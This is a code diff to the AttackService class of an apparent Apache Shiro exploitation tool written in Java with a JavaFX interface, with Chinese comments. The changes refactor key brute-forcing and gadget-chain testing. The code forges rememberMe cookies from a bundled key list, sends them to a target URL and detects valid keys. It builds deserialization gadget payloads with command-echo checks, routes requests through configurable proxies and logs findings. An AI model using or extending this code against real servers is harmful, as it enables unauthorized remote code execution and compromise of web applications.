@@ -11,6 +11,7 @@ import com.liev.clouds.payload.shiro.util.HttpUtil;
 import com.liev.clouds.utils.shiroutils.Shiro;
 import com.liev.clouds.payload.shiro.util.Utils;
 import com.liev.clouds.webcontroller.middleware.ShiroController;
+import javafx.application.Platform;
 import javafx.collections.ObservableList;
 import org.apache.shiro.codec.Base64;
 
@@ -38,6 +39,8 @@ public class AttackService {
     public static String postData = null;
     private final ShiroController shiroController;
     public int flagCount = 0;
+    private volatile boolean foundKey = false;
+    private volatile boolean isBruteForcing = false;
 
     private static ProxyConfig proxyConfig = new ProxyConfig();
 
@@ -49,21 +52,34 @@ public class AttackService {
         proxyConfig = config;
     }
 
+    /**
+     * 构造函数，初始化攻击服务的参数。
+     * @param method 请求方法
+     * @param url 目标 URL
+     * @param shiroKeyWord Shiro Cookie 的关键字
+     * @param timeout 请求超时时间（秒）
+     * @param globalHeader 全局请求头
+     * @param postData POST 数据
+     */
     public AttackService(String method, String url, String shiroKeyWord, String timeout, Map<String, String> globalHeader, String postData) {
         this.shiroController = (ShiroController) ControllersFactory.controllers.get(ShiroController.class.getSimpleName());
         this.url = url;
         this.method = method;
-        this.timeout = Integer.parseInt(timeout) * 1000;
+        this.timeout = Integer.parseInt(timeout) * 1000; // 转换为毫秒
         this.shiroKeyWord = shiroKeyWord;
         this.globalHeader = globalHeader;
         this.postData = postData;
-
     }
 
+    /**
+     * 合并传入的请求头与全局请求头。
+     * @param header 传入的请求头
+     * @return 合并后的请求头
+     */
     public HashMap<String, String> getCombineHeaders(HashMap<String, String> header) {
-        HashMap<String, String> combineHeaders = new HashMap();
+        HashMap<String, String> combineHeaders = new HashMap<>();
         Set<String> keySet = globalHeader.keySet();
-        if (keySet.size() != 0) {
+        if (!keySet.isEmpty()) {
             for (String key : keySet) {
                 if (key.equals("Cookie")) {
                     header.replace("Cookie", globalHeader.get(key) + "; " + header.get(key));
@@ -79,59 +95,62 @@ public class AttackService {
         return combineHeaders;
     }
 
+    /**
+     * 通过请求头发送 HTTP 请求并返回响应结果。
+     * @param header 请求头
+     * @return 响应结果
+     */
     public String headerHttpRequest(HashMap<String, String> header) {
         String result = null;
-        HashMap combineHeaders = this.getCombineHeaders(header);
+        HashMap<String, String> combineHeaders = this.getCombineHeaders(header);
         Proxy proxy = (proxyConfig != null && proxyConfig.getProxy() != Proxy.NO_PROXY) ? proxyConfig.getProxy() : Proxy.NO_PROXY;
         try {
-/*            result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
-            return result;*/
-/*            if (result.contains("Host")){
-                return result;
-            }*/
+            // 发送 HTTP 请求
             if (this.method.equals("GET")) {
-                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
-
+                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method), this.url)
+                        .setProxy(proxy).headerMap(combineHeaders, true)
+                        .setFollowRedirects(false).execute().toString();
             } else {
-//                result = HttpUtil.postHeaderByHttpRequest(this.url, "UTF-8", this.postData, combineHeaders, this.timeout);
-//                result = bodyHttpRequest(combineHeaders, this.postData);
                 result = HttpUtil.postHttpReuest(this.url, this.postData, "UTF-8", combineHeaders, "application/x-www-form-urlencoded", this.timeout);
                 System.out.println(result);
-
             }
-        } catch (Exception var5) {
-            this.shiroController.log.appendText(Utils.log(var5.getMessage()));
+        } catch (Exception e) {
+            this.shiroController.log.appendText(Utils.log(e.getMessage()));
         }
-
-
         return result;
     }
 
+    /**
+     * 通过 POST 请求发送 HTTP 请求体并返回响应结果。
+     * @param header 请求头
+     * @param postString 请求体数据
+     * @return 响应结果
+     */
     public String bodyHttpRequest(HashMap<String, String> header, String postString) {
         String result = "";
-        HashMap combineHeaders = this.getCombineHeaders(header);
+        HashMap<String, String> combineHeaders = this.getCombineHeaders(header);
         Proxy proxy = (proxyConfig != null && proxyConfig.getProxy() != Proxy.NO_PROXY) ? proxyConfig.getProxy() : Proxy.NO_PROXY;
         try {
-
+            // 发送 HTTP 请求
             if (postString.equals("")) {
-                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
-                if (result.contains("Host")){
-                    return result;
-                }
-                result = HttpUtil.getHttpReuest(this.url, this.timeout, "UTF-8", combineHeaders);
-            } else if (!result.contains("Host") | !this.method.equals("GET")) {
+                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method), this.url)
+                        .setProxy(proxy).headerMap(combineHeaders, true)
+                        .setFollowRedirects(false).execute().toString();
+            } else {
                 result = HttpUtil.postHttpReuest(this.url, postString, "UTF-8", combineHeaders, "application/x-www-form-urlencoded", this.timeout);
             }
-        } catch (Exception var6) {
-            this.shiroController.log.appendText(Utils.log(var6.getMessage()));
+        } catch (Exception e) {
+            this.shiroController.log.appendText(Utils.log(e.getMessage()));
         }
-
         return result;
     }
 
+    /**
+     * 获取所有的 Shiro 密钥。
+     * @return 密钥列表
+     */
     public List<String> getALLShiroKeys() {
         ArrayList<String> shiroKeys = new ArrayList<>();
-
         try {
             InputStream inputStream = getClass().getClassLoader().getResourceAsStream("data/shiro_keys.txt");
             if (inputStream == null) {
@@ -139,44 +158,48 @@ public class AttackService {
             }
 
             BufferedReader br = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));
-
             String line;
             while ((line = br.readLine()) != null) {
                 shiroKeys.add(line);
             }
             br.close();
-        } catch (Exception var12) {
-            String message = var12.getMessage();
-            System.out.println(message);
+        } catch (Exception e) {
+            this.shiroController.log.appendText(Utils.log(e.getMessage()));
         }
-
         return shiroKeys;
     }
 
 
-    public List<String> generateGadgetEcho(ObservableList gadgetItems, ObservableList echoesItems) {
-        List<String> targets = new ArrayList();
-
-        for(int i = 0; i < gadgetItems.size(); ++i) {
-            for(int j = 0; j < echoesItems.size(); ++j) {
-                System.out.println();
-                System.out.println(echoesItems.get(j));
-                targets.add(gadgetItems.get(i) + ":" + echoesItems.get(j));
+    /**
+     * 根据 Gadget 和 Echo 生成目标列表。
+     * @param gadgetItems Gadget 项目
+     * @param echoesItems Echo 项目
+     * @return 生成的目标列表
+     */
+    public List<String> generateGadgetEcho(ObservableList<String> gadgetItems, ObservableList<String> echoesItems) {
+        List<String> targets = new ArrayList<>();
+        for (String gadget : gadgetItems) {
+            for (String echo : echoesItems) {
+                targets.add(gadget + ":" + echo);
             }
         }
-
         return targets;
     }
 
+    /**
+     * 测试是否可以通过特定的 Shiro Key 构造有效的 Gadget。
+     * @param gadgetOpt Gadget 选项
+     * @param echoOpt Echo 选项
+     * @param spcShiroKey 指定的 Shiro Key
+     * @return 是否找到有效的构造链
+     */
     public boolean gadgetCrack(String gadgetOpt, String echoOpt, String spcShiroKey) {
         boolean flag = false;
-
         try {
             String rememberMe = this.GadgetPayload(gadgetOpt, echoOpt, spcShiroKey);
             if (rememberMe != null) {
-                HashMap header = new HashMap();
+                HashMap<String, String> header = new HashMap<>();
                 header.put("Cookie", rememberMe + ";");
-//                header.put("Host", "08fb41620aa4c498a1f2ef09bbc1183c");
                 String result = this.headerHttpRequest(header);
                 if (result.contains("Host")) {
                     this.shiroController.log.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
@@ -190,10 +213,9 @@ public class AttackService {
                     this.shiroController.log.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt));
                 }
             }
-        } catch (Exception var8) {
-            this.shiroController.log.appendText(Utils.log(var8.getMessage()));
+        } catch (Exception e) {
+            this.shiroController.log.appendText(Utils.log(e.getMessage()));
         }
-
         return flag;
     }
 
@@ -313,6 +335,7 @@ public class AttackService {
         }
         return sb.toString();
     }
+
     //计算包含几个deleteMe
     public int countDeleteMe(String text){
         // 根据指定的字符构建正则
@@ -327,41 +350,98 @@ public class AttackService {
         return  count;
 
     }
+
+
     public void keyTestTask(final List<String> shiroKeys) {
-        Thread thread = new Thread(new Runnable() {
-            public void run() {
-                try {
-                    for(int i = 0; i < shiroKeys.size(); ++i) {
-                        String shirokey = (String)shiroKeys.get(i);
+        Thread thread = new Thread(() -> {
+            try {
+                if (!isBruteForcing) {
+                    isBruteForcing = true;  // 标记为正在爆破
+                    Platform.runLater(() -> AttackService.this.shiroController.log.appendText(Utils.log("[*] 爆破中...\n")));
+                }
 
-                        try {
-                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
-                            HashMap<String, String> header = new HashMap();
-                            header.put("Cookie", rememberMe);
-                            String result = AttackService.this.headerHttpRequest(header);
-                            Thread.sleep(100L);
-                            if (result!=null &&!result.isEmpty()&&!result.contains("=deleteMe")) {
-                                AttackService.this.shiroController.log.appendText(Utils.log("[++] 找到key：" + shirokey));
-                                AttackService.this.shiroController.specifyKey.setText(shirokey);
+                for (String shirokey : shiroKeys) {
+                    if (foundKey) {
+                        break;  // 如果已经找到 key，立即退出循环
+                    }
+
+                    try {
+                        String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, shirokey);
+                        HashMap<String, String> header = new HashMap<>();
+                        header.put("Cookie", rememberMe);
+                        String result = AttackService.this.headerHttpRequest(header);
+                        Thread.sleep(100L);
+
+                        // 每次循环输出当前检测的 key
+                        Platform.runLater(() -> AttackService.this.shiroController.log.appendText(Utils.log("[*] 正在测试 key: " + shirokey + "\n")));
+
+                        if (result != null && !result.isEmpty() && !result.contains("=deleteMe")) {
+                            if (!foundKey) {  // 再次检查以防止多个线程同时输出
+                                foundKey = true;
+                                Platform.runLater(() -> {
+                                    AttackService.this.shiroController.log.appendText(Utils.log("[++] 找到 key：" + shirokey + "\n"));
+                                    AttackService.this.shiroController.specifyKey.setText(shirokey);
+                                });
                                 AttackService.realShiroKey = shirokey;
-                                break;
                             }
-
-                            AttackService.this.shiroController.log.appendText(Utils.log("[-] " + shirokey));
-                        } catch (Exception var6) {
-                            AttackService.this.shiroController.log.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
+                            break;
                         }
 
+                    } catch (Exception e) {
+                        Platform.runLater(() -> AttackService.this.shiroController.log.appendText(Utils.log("[-] " + shirokey + " " + e.getMessage() + "\n")));
                     }
-                    AttackService.this.shiroController.log.appendText(Utils.log("[+] 爆破结束"));
-
-                } catch (Exception var7) {
-                    throw var7;
                 }
+
+                // 如果未找到 key，显示爆破结束
+                if (!foundKey) {
+                    Platform.runLater(() -> AttackService.this.shiroController.log.appendText(Utils.log("[+] 爆破结束，但未找到有效 key\n")));
+                }
+
+                isBruteForcing = false;  // 爆破结束，重置标志位
+
+            } catch (Exception e) {
+                e.printStackTrace();  // 打印异常信息
             }
         });
         thread.start();
     }
+
+
+//    public void keyTestTask(final List<String> shiroKeys) {
+//        Thread thread = new Thread(new Runnable() {
+//            public void run() {
+//                try {
+//                    for(int i = 0; i < shiroKeys.size(); ++i) {
+//                        String shirokey = (String)shiroKeys.get(i);
+//
+//                        try {
+//                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
+//                            HashMap<String, String> header = new HashMap();
+//                            header.put("Cookie", rememberMe);
+//                            String result = AttackService.this.headerHttpRequest(header);
+//                            Thread.sleep(100L);
+//                            if (result!=null &&!result.isEmpty()&&!result.contains("=deleteMe")) {
+//                                AttackService.this.shiroController.log.appendText(Utils.log("[++] 找到key：" + shirokey));
+//                                AttackService.this.shiroController.specifyKey.setText(shirokey);
+//                                AttackService.realShiroKey = shirokey;
+//                                break;
+//                            }
+//
+//                            AttackService.this.shiroController.log.appendText(Utils.log("[-] " + shirokey));
+//                        } catch (Exception var6) {
+//                            AttackService.this.shiroController.log.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
+//                        }
+//
+//                    }
+//                    AttackService.this.shiroController.log.appendText(Utils.log("[+] 爆破结束"));
+//
+//                } catch (Exception var7) {
+//                    throw var7;
+//                }
+//            }
+//        });
+//        thread.start();
+//    }
 
     public void keyTestTask2(final List<String> shiroKeys) {
         Thread thread = new Thread(new Runnable() {
